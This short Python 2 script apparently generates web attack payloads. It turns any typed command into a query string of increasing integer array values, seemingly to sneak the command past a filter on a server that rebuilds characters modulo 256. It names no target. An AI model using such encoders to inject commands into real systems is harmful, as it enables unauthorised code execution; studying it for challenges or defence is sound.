#!/usr/bin/env python
#-*- encoding:utf-8 -*-

cmd = raw_input('cmd: ')

first = True
biggest = 0
payload = ''
for i in cmd:
    tmp = ord(i)
    while (tmp < biggest):
        tmp += 256
    biggest = tmp
    if first:
        payload += ('?💩[]=' + str(tmp))
        first = False
    else:
        payload += ('&💩[]=' + str(tmp))

print payload
